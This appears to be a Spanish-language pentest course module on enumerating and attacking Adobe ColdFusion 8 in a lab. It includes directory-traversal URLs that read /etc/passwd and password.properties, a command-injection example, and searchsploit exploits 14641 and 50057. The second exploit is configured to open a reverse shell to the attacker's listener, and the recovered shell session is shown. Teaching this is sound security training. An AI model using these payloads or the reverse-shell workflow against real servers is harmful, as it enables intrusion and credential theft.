---
tags:
  - Enumeración
---

## Enumeración

ColdFusion es un lenguaje de programación y una plataforma de desarrollo de aplicaciones web basada en Java. ColdFusion fue desarrollado inicialmente por Allaire Corporation en 1995 y fue adquirido por Macromedia en 2001. Macromedia fue adquirida más tarde por Adobe Systems, que ahora posee y desarrolla ColdFusion.

Se utiliza para crear aplicaciones web dinámicas e interactivas que se pueden conectar a varias API y bases de datos como MySQL, Oracle y Microsoft SQL Server. ColdFusion se lanzó por primera vez en 1995 y desde entonces se ha convertido en una plataforma poderosa y versátil para el desarrollo web.

Lenguaje de marcado ColdFusion (`CFML`) es el lenguaje de programación patentado utilizado en ColdFusion para desarrollar aplicaciones web dinámicas. Tiene una sintaxis similar a HTML, lo que facilita el aprendizaje para los desarrolladores web. CFML incluye etiquetas y funciones para la integración de bases de datos, servicios web, administración de correo electrónico y otras tareas comunes de desarrollo web. Su enfoque basado en etiquetas simplifica el desarrollo de aplicaciones al reducir la cantidad de código necesario para realizar tareas complejas. Por ejemplo, el `cfquery` tag puede ejecutar sentencias SQL para recuperar datos de una base de datos:

```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

Los desarrolladores pueden usar el `cfloop` etiqueta para iterar a través de los registros recuperados de la base de datos:

```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```


1. CVE-2021-21087: Rechazo arbitrario de cargar el código fuente JSP
2. CVE-2020-24453: Configuración incorrecta de la integración de Active Directory
3. CVE-2020-24450: Vulnerabilidad de inyección de comandos
4. CVE-2020-24449: Vulnerabilidad arbitraria de lectura de archivos
5. CVE-2019-15909: Vulnerabilidad de secuencias de comandos en sitios cruzados (XSS)


ColdFusion expone unos pocos puertos por defecto:

|Número de Puerto|Protocolo|Descripción|
|---|---|---|
|80|HTTP|Se utiliza para la comunicación HTTP no segura entre el servidor web y el navegador web.|
|443|HTTPS|Se utiliza para la comunicación HTTP segura entre el servidor web y el navegador web. Cifra la comunicación entre el servidor web y el navegador web.|
|1935|RPC|Utilizado para la comunicación cliente-servidor. El protocolo Remote Procedure Call (RPC) permite que un programa solicite información de otro programa en un dispositivo de red diferente.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) se utiliza para enviar mensajes de correo electrónico.|
|8500|SSL|Se utiliza para la comunicación del servidor a través de Secure Socket Layer (SSL).|
|5500|Monitor de Servidor|Utilizado para la administración remota del servidor ColdFusion.|

Es importante tener en cuenta que los puertos predeterminados se pueden cambiar durante la instalación o configuración.

---

Durante una enumeración de pruebas de penetración, existen varias formas de identificar si una aplicación web utiliza ColdFusion. Aquí hay algunos métodos que se pueden utilizar:

|**Método**|**Descripción**|
|---|---|
|`Port Scanning`|ColdFusion normalmente utiliza el puerto 80 para HTTP y el puerto 443 para HTTPS de forma predeterminada. Por lo tanto, el escaneo de estos puertos puede indicar la presencia de un servidor ColdFusion. Nmap podría identificar ColdFusion durante un escaneo de servicios específicamente.|
|`File Extensions`|Las páginas de ColdFusion suelen utilizar extensiones de archivo ".cfm" o ".cfc". Si encuentra páginas con estas extensiones de archivo, podría ser un indicador de que la aplicación está utilizando ColdFusion.|
|`HTTP Headers`|Compruebe los encabezados de respuesta HTTP de la aplicación web. ColdFusion normalmente establece encabezados específicos, como "Server: ColdFusion" o "X-Powered-By: ColdFusion", que pueden ayudar a identificar la tecnología que se utiliza.|
|`Error Messages`|Si la aplicación utiliza ColdFusion y hay errores, los mensajes de error pueden contener referencias a etiquetas o funciones específicas de ColdFusion.|
|`Default Files`|ColdFusion crea varios archivos predeterminados durante la instalación, como "admin.cfm" o "CFIDE/administrator/index.cfm". Encontrar estos archivos en el servidor web puede indicar que la aplicación web se ejecuta en ColdFusion.|

#### Puertos NMap y resultados de escaneo de servicio

```shell-session
vcrdcr@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds

```

Los resultados del escaneo de puertos muestran tres puertos abiertos. Dos servicios de Windows RPC y uno ejecutándose `8500`. Como sabemos, `8500` es un puerto predeterminado que ColdFusion utiliza para SSL. Navegando hacia el `IP:8500` listas 2 directorios, `CFIDE` y `cfdocs,` en la raíz, lo que indica además que ColdFusion se está ejecutando en el puerto 8500.

Navegar un poco por la estructura muestra mucha información interesante, desde archivos con un claro `.cfm` extensión a mensajes de error y páginas de inicio de sesión.

![Listado de directorio de root con carpetas CFIDE y cfdocs.](https://academy.hackthebox.com/storage/modules/113/coldfusion/CFindex.png)

![Página web que muestra la lista de directorios de /CFIDE/ con archivos y carpetas como Application.cfm, adminapi/ e install.cfm, a la que se accede a través de IP 10.129.247.30:8500.](https://academy.hackthebox.com/storage/modules/113/coldfusion/CFIDE.png)

![Página de error que muestra 'Solicitud no válida de Application.cfm' con información de depuración y recursos para la resolución de errores de ColdFusion.](https://academy.hackthebox.com/storage/modules/113/coldfusion/CFError.png)

El `/CFIDE/administrator` sin embargo, path carga la página de inicio de sesión de ColdFusion 8 Administrator. Ahora sabemos con certeza que `ColdFusion 8` se ejecuta en el servidor.

![Pantalla de inicio de sesión de ColdFusion Administrator con campos para nombre de usuario y contraseña.](https://academy.hackthebox.com/storage/modules/113/coldfusion/CF8.png)

---

Nota: Existe la posibilidad de que la Máquina Virtual tome largos períodos de tiempo para responder (hasta 90s), por favor sea paciente


## Ataque

Ahora que sabemos que ColdFusion 8 es un objetivo, el siguiente paso es verificar los exploits conocidos existentes. `Searchsploit` es una herramienta de línea de comandos para `searching and finding exploits` en la base de datos Exploit. Es parte del proyecto Exploit Database, una organización sin fines de lucro que proporciona un repositorio público de exploits y software vulnerable. `Searchsploit` busca a través de la base de datos Exploit y devuelve una lista de exploits y sus detalles relevantes, incluido el nombre del exploit, su descripción y la fecha en que se lanzó.

#### Buscarsploit

```shell-session
vcrdcr@htb[/htb]$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Como sabemos, la versión de ColdFusion en ejecución es `ColdFusion 8`, y hay dos resultados de interés. El `Adobe ColdFusion - Directory Traversal` y el `Adobe ColdFusion 8 - Remote Command Execution (RCE)` resultados.

---

### Directorio Traversal

`Directory/Path Traversal` es un ataque que permite a un atacante acceder a archivos y directorios fuera del directorio previsto en una aplicación web. El ataque explota la falta de validación de entrada en una aplicación web y se puede ejecutar a través de varios `input fields` como `URL parameters`, `form fields`, `cookies`, y más. Al manipular los parámetros de entrada, el atacante puede atravesar la estructura de directorios de la aplicación web y `access sensitive files`, incluyendo `configuration files`, `user data`, y otros archivos del sistema. El ataque se puede ejecutar manipulando los parámetros de entrada en etiquetas ColdFusion como `CFFile` y `CFDIRECTORY,` que se utilizan para operaciones de archivos y directorios, como cargar, descargar y enumerar archivos.

Tome el siguiente fragmento de código de ColdFusion:

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

En este fragmento de código, el ColdFusion `cfdirectory` la etiqueta enumera el contenido de la `uploads` directorio, y el `cfloop` la etiqueta se utiliza para recorrer los resultados de la consulta y mostrar los nombres de archivo como enlaces en HTML.

Sin embargo, el `directory` el parámetro no se valida correctamente, lo que hace que la aplicación sea vulnerable a un ataque Path Traversal. Un atacante puede explotar esta vulnerabilidad manipulando el `directory` parámetro para acceder a archivos fuera del `uploads` directorio.

```http
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

En este ejemplo, el `../` la secuencia se utiliza para navegar por el árbol de directorios y acceder al `/etc/passwd` archivo fuera de la ubicación prevista.

`CVE-2010-2861` es el `Adobe ColdFusion - Directory Traversal` exploit descubierto por `searchsploit`. Es una vulnerabilidad en ColdFusion que permite a los atacantes realizar ataques de recorrido de ruta.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

Estos archivos ColdFusion son vulnerables a un ataque de salto de directorio en `Adobe ColdFusion 9.0.1` y `earlier versions`. Los atacantes remotos pueden explotar esta vulnerabilidad para leer archivos arbitrarios manipulando `locale parameter` en estos archivos específicos de ColdFusion.

Con esta vulnerabilidad, los atacantes pueden acceder a archivos fuera del directorio previsto incluyendo `../` secuencias en el parámetro de archivo. Por ejemplo, considere la siguiente URL:

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

En este ejemplo, la URL intenta acceder al `mappings.cfm` archivo en el `/CFIDE/administrator/settings/` directorio de la aplicación web con un `en` local. Sin embargo, un ataque de salto de directorio se puede ejecutar manipulando el parámetro de configuración regional de la URL, lo que permite a un atacante leer archivos arbitrarios ubicados fuera del directorio previsto, como archivos de configuración o archivos del sistema.

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

En este ejemplo, el `../` las secuencias se han utilizado para reemplazar un válido `locale` para atravesar la estructura de directorios y acceder al `passwd` archivo ubicado en el `/etc/` directorio.

Usando `searchsploit`, copie el exploit en un directorio de trabajo y luego ejecute el archivo para ver qué argumentos requiere.

```shell-session
vcrdcr@htb[/htb]$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

#### Coldfusion - Explotación

```shell-session
vcrdcr@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
vcrdcr@htb[/htb]$ python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

El `password.properties` file en ColdFusion es un archivo de configuración que almacena de forma segura contraseñas cifradas para diversos servicios y recursos que utiliza el servidor de ColdFusion. Contiene una lista de pares clave-valor, donde la clave representa el nombre del recurso y el valor es la contraseña cifrada. Estas contraseñas cifradas se utilizan para servicios como `database connections`, `mail servers`, `LDAP servers`, y otros recursos que requieren autenticación. Al almacenar contraseñas cifradas en este archivo, ColdFusion puede recuperarlas automáticamente y usarlas para autenticarse con los servicios respectivos sin requerir la entrada manual de contraseñas cada vez. El archivo suele estar en el `[cf_root]/lib` directorio y se puede administrar a través del Administrador de ColdFusion.

Al proporcionar los parámetros correctos al script exploit y especificar la ruta del archivo deseado, el script puede activar un exploit en los puntos finales vulnerables mencionados anteriormente. El script emitirá el resultado del intento de explotación:

#### Coldfusion - Explotación

```shell-session
vcrdcr@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

Como podemos ver, el contenido de la `password.properties` se han recuperado archivos, lo que demuestra que este objetivo es vulnerable a `CVE-2010-2861`.

---

### RCE no autenticado

Ejecución Remota de Código no autenticada (`RCE`) es un tipo de vulnerabilidad de seguridad que permite a un atacante `execute arbitrary code` en un sistema vulnerable `without requiring authentication`. Este tipo de vulnerabilidad puede tener graves consecuencias, como lo hará `enable an attacker to take complete control of the system` y potencialmente robar datos confidenciales o causar daños al sistema.

La diferencia entre a `RCE` y un `Unauthenticated Remote Code Execution` es si un atacante necesita o no proporcionar credenciales de autenticación válidas para explotar la vulnerabilidad. Una vulnerabilidad RCE permite a un atacante ejecutar código arbitrario en un sistema de destino, independientemente de si tiene o no credenciales válidas. Sin embargo, en muchos casos, las vulnerabilidades de RCE requieren que el atacante ya tenga acceso a alguna parte del sistema, ya sea a través de una cuenta de usuario u otros medios.

Por el contrario, una vulnerabilidad RCE no autenticada permite a un atacante ejecutar código arbitrario en un sistema de destino sin credenciales de autenticación válidas. Esto hace que este tipo de vulnerabilidad sea particularmente peligroso, ya que un atacante puede hacerse cargo de un sistema o ejecutar comandos maliciosos sin ninguna barrera de entrada.

En el contexto de las aplicaciones web de ColdFusion, se produce un ataque RCE no autenticado cuando un atacante puede ejecutar código arbitrario en el servidor sin necesidad de autenticación. Esto puede suceder cuando una aplicación web permite la ejecución de código arbitrario a través de una función o función que no requiere autenticación, como una consola de depuración o una funcionalidad de carga de archivos. Toma el siguiente código:

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

En el código anterior, el `cmd` la variable se crea concatenando el `cgi.query_string` variable con un comando a ejecutar. Este comando se ejecuta entonces usando el `cfexecute` función, que ejecuta Windows `cmd.exe` programa con los argumentos especificados. Este código es vulnerable a un ataque RCE no autenticado porque no valida correctamente el `cmd` variable antes de ejecutarlo, ni requiere que el usuario sea autenticado. Un atacante podría simplemente pasar un comando malicioso como el `cgi.query_string` variable, y sería ejecutado por el servidor.

```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Esta URL incluye un punto y coma (`%3B`) al comienzo de la cadena de consulta, que puede permitir la ejecución de múltiples comandos en el servidor. Esto podría agregar una funcionalidad legítima con un comando no deseado. El incluido `echo` el comando imprime un mensaje en la consola y es seguido por un comando de redirección para escribir un archivo en la consola `C:` directorio con un mensaje que indica que el servidor ha sido comprometido.

Un ejemplo de un ataque RCE no autenticado de ColdFusion es el `CVE-2009-2265` vulnerabilidad que afectó a Adobe ColdFusion versiones 8.0.1 y anteriores. Este exploit permitió a los usuarios no autenticados cargar archivos y obtener la ejecución remota de código en el host de destino. La vulnerabilidad existe en el paquete FCKeditor, y es accesible en la siguiente ruta:

```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

`CVE-2009-2265` es la vulnerabilidad identificada por nuestra búsqueda anterior de searchsploit como `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Llévalo a un directorio de trabajo.

### Envio de revshell

#### Buscarsploit

```shell-session
vcrdcr@htb[/htb]$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard
```

```shell-session
vcrdcr@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Un rápido `cat` la revisión del código indica que el script necesita alguna información. Establezca la información correcta y inicie el exploit.

#### Explotar Modificación

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

El exploit tardará un poco de tiempo en lanzarse, pero eventualmente devolverá un shell remoto funcional

#### Explotación

```shell-session
vcrdcr@htb[/htb]$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

#### Shell Inverso

```cmd-session
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```

